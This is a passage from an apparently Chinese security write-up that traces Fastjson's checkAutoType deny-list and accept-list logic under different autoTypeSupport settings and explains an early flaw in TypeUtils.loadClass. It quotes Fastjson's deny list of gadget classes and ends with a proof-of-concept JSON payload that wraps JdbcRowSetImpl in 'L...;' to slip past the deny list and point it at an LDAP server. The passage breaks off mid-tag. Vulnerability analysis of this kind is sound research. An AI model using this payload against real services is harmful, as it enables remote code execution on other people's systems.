class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (typeName == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">final</span> String className = typeName.replace(<span class=\"string\">&#x27;$&#x27;</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (autoTypeSupport || expectClass != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        ⋮</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (clazz == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        ⋮</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (clazz != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        ⋮</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!autoTypeSupport) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class=\"line\">            String deny = denyList[i];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (className.startsWith(deny)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class=\"line\">            String accept = acceptList[i];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (className.startsWith(accept)) &#123;</span><br><span class=\"line\">                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (expectClass != <span class=\"keyword\">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;type not match. &quot;</span> + typeName + <span class=\"string\">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>由于autoTypeSupport为False，程序进入if (!autoTypeSupport)分支中</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (!autoTypeSupport) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class=\"line\">        String deny = denyList[i];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (className.startsWith(deny)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class=\"line\">        String accept = acceptList[i];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (className.startsWith(accept)) &#123;</span><br><span class=\"line\">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (expectClass != <span class=\"keyword\">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;type not match. &quot;</span> + typeName + <span class=\"string\">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>程序首先遍历denyList这一黑名单，并判断className与黑名单是否匹配</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811151624-904c2f3e-dba2-1.png\" alt=\"934359dd24e91c0eae2b706a4721c00d.png\"></p>\n<p>这里需要说明一下：className变量是由typeName简单变换而来，而typeName即为@type字段值。详见下图代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811151634-96d0d38c-dba2-1.png\" alt=\"c2e0aee6246db707820606da77be9959.png\"></p>\n<p>接下来看下黑名单中的元素</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811151645-9d460688-dba2-1.png\" alt=\"fdc610a0d2a6392ae7f762de681b70e8.png\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">denyList =</span><br><span class=\"line\"><span class=\"string\">&quot;bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>如果className命中黑名单，程序抛出”autoType is not support.”异常并结束</p>\n<p>在黑名单过滤完成后，程序还会将className与白名单匹配一下，下图中红框里的for循环即为白名单匹配过程</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811151704-a8b4b780-dba2-1.png\" alt=\"0a39d8ffe2cf014fd9911637f87f606e.png\"></p>\n<p>程序将className与acceptList白名单进行匹配，通过动态调试查看以下默认白名单中的值</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811151715-aee0e7fa-dba2-1.png\" alt=\"728bed570e73423cc97341d28103790d.png\"></p>\n<p>从动态调试的结果可见，acceptList默认情况下是一个空列表。</p>\n<p>开发者可以通过ParserConfig.getGlobalInstance().addAccept()自行向acceptList白名单中增加元素。如下代码向白名单中增加了一个AutoTypeTest.Test1类</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        ParserConfig.getGlobalInstance().addAccept(<span class=\"string\">&quot;AutoTypeTest.Test1&quot;</span>);</span><br><span class=\"line\">        String jsonstr = <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;AutoTypeTest.Test1\\&quot;,\\&quot;s1\\&quot;:\\&quot;1\\&quot;&#125;&quot;</span>;</span><br><span class=\"line\">        Object obj = JSON.parseObject(jsonstr);</span><br><span class=\"line\">        System.out.println(obj);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在白名单匹配环节，如果className指定的类与白名单中的项相匹成功，程序将该类的类对象赋值与clazz变量并返回</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811151736-bbb9bede-dba2-1.png\" alt=\"65eefbeb121ed88086f2a3b56d0f52af.png\"></p>\n<p>程序接下来将传入的json字符串反序列为该类对象</p>\n<p>在程序执行完黑名单与白名单校验后，既没有匹配到黑名单，也没有匹配到白名单的话，程序最终会执行到下图分支</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811151754-c5f10970-dba2-1.png\" alt=\"a5f4f7b4da2b416081ae013ea2ea93c9.png\"></p>\n<p>此时程序将抛出异常并结束</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811151804-cc209b58-dba2-1.png\" alt=\"92d6e52681cbab4b63d15ef0f1d39667.png\"></p>\n<p>由于在1.2.25以及之后的版本中，autoTypeSupport值默认False。所以1.2.25以及之后的版本中假使攻击者构造的payload中的恶意类绕过了黑名单，但如果payload中的类不在白名单上，也是不能成功利用的。值得注意的是，白名单默认情况是空的。在此场景下payload想要执行成功，只有一种可能性：</p>\n<ul>\n<li>@type字段值在不在黑名单中且在白名单中</li>\n</ul>\n<h3 id=\"autoTypeSupport值为False、使用parseObject-String-text-Class-lt-T-gt-clazz\"><a href=\"#autoTypeSupport值为False、使用parseObject-String-text-Class-lt-T-gt-clazz\" class=\"headerlink\" title=\"autoTypeSupport值为False、使用parseObject(String text, Class&lt;T&gt; clazz)\"></a>autoTypeSupport值为False、使用parseObject(String text, Class&lt;T&gt; clazz)</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        String jsonstr = <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;AutoTypeTest.Test1\\&quot;,\\&quot;s1\\&quot;:\\&quot;1\\&quot;&#125;&quot;</span>;</span><br><span class=\"line\">        Object obj = JSON.parseObject(jsonstr, AutoTypeTest.Test.class);</span><br><span class=\"line\">        System.out.println(obj);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>注意上图，这里parseObject中的Class&lt;T&gt; clazz参数是AutoTypeTest.Test.class，而@type中的是AutoTypeTest.Test1，二者不是一个类。如果是一个类，根据上文checkAutoType触发条件分析，根本不会触发checkAutoType</p>\n<p>在这种情况下，我们再来看看checkAutoType会如何处理我们的数据</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (typeName == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">final</span> String className = typeName.replace(<span class=\"string\">&#x27;$&#x27;</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (autoTypeSupport || expectClass != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class=\"line\">            String accept = acceptList[i];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (className.startsWith(accept)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class=\"line\">            String deny = denyList[i];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (className.startsWith(deny)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>此时autoTypeSupport为true，expectClass不为空，程序会首先进入if (autoTypeSupport || expectClass != null)分支</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811151827-d9eab0a2-dba2-1.png\" alt=\"ecafe6fede023596c9569bc166e154ae.png\"></p>\n<p>值得注意的是，这个分支中是先匹配白名单，后匹配黑名单，如果@type字段指定的类在白名单中，则直接返回，不需要再经过黑名单过滤了。这一点很有意思，如果开发者因为开发失误，将存在利用的类加到了白名单里，攻击者是可以直接利用的</p>\n<p>回归正文，由于上图这里我们没有向白名单中增加AutoTypeTest.Test.class类，程序会接下来检查传入的类是否在黑名单中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811151838-e0ad1222-dba2-1.png\" alt=\"93d672dc9d0fcd22ed5472e5ad1e7dd8.png\"></p>\n<p>如果匹配到黑名单，则直接抛出错误</p>\n<p>如果这里既没有匹配到白名单直接返回，也没有匹配到黑名单抛出错误终止，程序则继续向下执行</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811151852-e8b00d9e-dba2-1.png\" alt=\"e88c7abb2f44009cab7f6ed16955765e.png\"></p>\n<p>继续执行到的这个分支与情况一中的完全一致，又匹配了一遍黑名单与白名单。显而易见，这里既不会匹配到白名单，也不会匹配到黑名单</p>\n<p>最后程序执行到下图这里</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811151904-efb62f74-dba2-1.png\" alt=\"0207749c04146ac393ecfe5159bb1d5b.png\"></p>\n<p>由于我们使用的是parseObject(String text, Class&lt;T&gt; clazz)这种方式，上图代码中872行处的expectClass即为Class&lt;T&gt; clazz传入的AutoTypeTest.Test.class类，而clazz变量为@type字段指定的AutoTypeTest.Test1.class类.程序通过</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">expectClass.isAssignableFrom(clazz)</span><br></pre></td></tr></table></figure>\n\n<p>判断Class&lt;T&gt; clazz传入的expectClass对象所表示的类是否与@type字段指定的clazz变量参数表示的类相同，或者是其超类或父接口。本例中AutoTypeTest.Test.class类与AutoTypeTest.Test1.class类所表示的类与接口不同，也不是超类或父类关系。因此程序抛出异常</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Exception in thread <span class=\"string\">&quot;main&quot;</span> com.alibaba.fastjson.JSONException: type not match.AutoTypeTest.Test1 -\\&gt; AutoTypeTest.Test</span><br></pre></td></tr></table></figure>\n\n<p>如果二者相同或者是超类、父类关系，程序将@type字段指定的类对象返回，并随后将传入字符串反序列化为该类对象</p>\n<ul>\n<li>此场景的安全隐患</li>\n</ul>\n<p>通过上文的分析，在此场景下程序会先匹配白名单、后匹配黑名单。如果@type字段指定的类在白名单中，则程序是会跳过黑名单校验的，例如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811152135-4a20674a-dba3-1.png\" alt=\"e1fc601a50996f55f7a347bec030c7cc.png\"></p>\n<p>即使com.sun.rowset.JdbcRowSetImpl在Fastjson默认黑名单中，但在开发的时候，由于开发安全意识不强或开发疏忽等原因，将com.sun.rowset.JdbcRowSetImpl加入了白名单，此时是可以绕过黑名单直接执行利用的。在此场景下，payload想执行成功，有两种可能性：</p>\n<ul>\n<li><p>没有命中黑名单且Class&lt;T&gt; clazz表示的类或接口是否与指定的@type字段值表示的类或接口相同，或者是其超类或父接口。</p>\n</li>\n<li><p>@type字段值在白名单中</p>\n</li>\n</ul>\n<h3 id=\"autoTypeSupport值为True、使用parseObject-String-text\"><a href=\"#autoTypeSupport值为True、使用parseObject-String-text\" class=\"headerlink\" title=\"autoTypeSupport值为True、使用parseObject(String text)\"></a>autoTypeSupport值为True、使用parseObject(String text)</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">    String jsonstr = <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;AutoTypeTest.Test1\\&quot;,\\&quot;s1\\&quot;:\\&quot;1\\&quot;&#125;&quot;</span>;</span><br><span class=\"line\">    Object obj = JSON.parseObject(jsonstr);</span><br><span class=\"line\">    System.out.println(obj)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在此场景中，程序首先进入了与上一场景相同的分支，与上一场景不同的是，这里是由于autoTypeSupport为true而进入此分支，而非上一场景满足expectClass != null这一条件</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811152202-59fb1002-dba3-1.png\" alt=\"b6c844dff52bc46218e02c1dbd3767d9.png\"></p>\n<p>与上一场景一致，程序先匹配白名单、后匹配黑名单。如果@type字段指定的类在白名单中，则直接返回，不再进行黑名单校验。在白名单未匹配成功后，使用黑名单进行匹配，若匹配到黑名单，直接抛出异常。如果黑白名单都未匹配成功，程序继续向下执行</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811152212-6019ceb0-dba3-1.png\" alt=\"0458fe27ed39a0e5e2dc5c69964b09af.png\"></p>\n<p>程序将@type字段指定的类返回</p>\n<p>这种情况下要是payload想成功利用有两种办法：</p>\n<ul>\n<li><p>@type字段值只需要不在黑名单中即可成功利用</p>\n</li>\n<li><p>@type字段值在黑名单中，但是开发的时候在白名单中加入了这个类，payload依然可以成功利用</p>\n</li>\n</ul>\n<h3 id=\"四、autoTypeSupport值为True、使用parseObject-String-text-Class-lt-T-gt-clazz\"><a href=\"#四、autoTypeSupport值为True、使用parseObject-String-text-Class-lt-T-gt-clazz\" class=\"headerlink\" title=\"四、autoTypeSupport值为True、使用parseObject(String text, Class&lt;T&gt; clazz)\"></a>四、autoTypeSupport值为True、使用parseObject(String text, Class&lt;T&gt; clazz)</h3><pre><code>public static void main(String[] args) &#123;\n    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);\n    String jsonstr = &quot;&#123;\\&quot;@type\\&quot;:\\&quot;AutoTypeTest.Test1\\&quot;,\\&quot;s1\\&quot;:\\&quot;1\\&quot;&#125;&quot;;\n    Object obj = JSON.parseObject(jsonstr,AutoTypeTest.Test.class);\n    System.out.println(obj)\n&#125;</code></pre>\n<p>与上文第二、三场景相同，程序首先进入了这个分支</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811152236-6e80c67a-dba3-1.png\" alt=\"0bf84f2d75a81d8e7fcf8958a65a3c34.png\"></p>\n<p>此场景进入该分支的原因是autoTypeSupport与expectClass这两个条件都满足。关于这个分支的执行流程这里不再复述了</p>\n<p>在没有匹配到黑白名单后，程序执行到了下图这里</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811152247-750ab5f0-dba3-1.png\" alt=\"7832ca5693b89b2f1fb912c9df9cfe76.png\"></p>\n<p>由于这里clazz与expectClass所表示的类与接口不同，也不是超类或父类关系。因此程序抛出异常</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Exception in thread <span class=\"string\">&quot;main&quot;</span> com.alibaba.fastjson.JSONException: type not match.AutoTypeTest.Test1 -\\&gt; AutoTypeTest.Test</span><br></pre></td></tr></table></figure>\n\n<p>在这种情况下，payload想执行成功，有两种可能性：</p>\n<ul>\n<li><p>没有命中黑名单且Class&lt;T&gt;<br>clazz表示的类或接口是否与指定的@type字段值表示的类或接口相同，或者是其超类或父接口。</p>\n</li>\n<li><p>@type字段值在白名单中</p>\n</li>\n</ul>\n<h2 id=\"早期checkAutoType安全机制缺陷\"><a href=\"#早期checkAutoType安全机制缺陷\" class=\"headerlink\" title=\"早期checkAutoType安全机制缺陷\"></a>早期checkAutoType安全机制缺陷</h2><p>在fastjson 1.2.25版本引入的checkAutoType以及后续的几个版本中存在着一定的缺陷</p>\n<p>如上文所分析，程序通常先经过黑名单与白名单的校验后，将满足条件的类对象通过如下代码赋值给clazz</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br></pre></td></tr></table></figure>\n\n<p>程序最终将字符串反序列化为clazz所表示的类对象。我们着重分析下TypeUtils.loadClass是如何实现的</p>\n<p>TypeUtils.loadClass方法位于com/alibaba/fastjson/util/TypeUtils.java中</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (className == <span class=\"keyword\">null</span> || className.length() == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (clazz != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (className.charAt(<span class=\"number\">0</span>) == <span class=\"string\">&#x27;[&#x27;</span>) &#123;</span><br><span class=\"line\">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class=\"number\">1</span>), classLoader);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> Array.newInstance(componentType, <span class=\"number\">0</span>).getClass();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (className.startsWith(<span class=\"string\">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class=\"string\">&quot;;&quot;</span>)) &#123;</span><br><span class=\"line\">        String newClassName = className.substring(<span class=\"number\">1</span>, className.length() - <span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> loadClass(newClassName, classLoader);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>问题就出在下图代码上：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811152330-8e91dc2e-dba3-1.png\" alt=\"9d5e68c2ef26557badccfca670540cc9.png\"></p>\n<p>当传入的className变量以”L”开头，并以”;”结尾，进入该if分支。在这个if分支中，程序将会把开头的”L”与结尾的”;”去掉，并递归调用loadClass加载这个类。因此可以下图这样构造来进行绕过</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811152340-94667736-dba3-1.png\" alt=\"54ce372006a50b8930efc41634dcb40b.png\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">    String jsonstr = <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\\&quot;,\\&quot;dataSourceName\\&quot;:\\&quot;ldap://localhost:1389/ExecTest\\&quot;,&quot;</span> +</span><br><span class=\"line\">            <span class=\"string\">&quot; \\&quot;autoCommit\\&quot;:true&#125;&quot;</span>;</span><br><span class=\"line\">    Object obj = JSON.parseObject(jsonstr);</span><br><span class=\"line\">    System.out.println(obj);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>loadClass会将”L”与”;”去除后组成newClassName并返回</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811152351-9abad58c-dba3-1.png\" 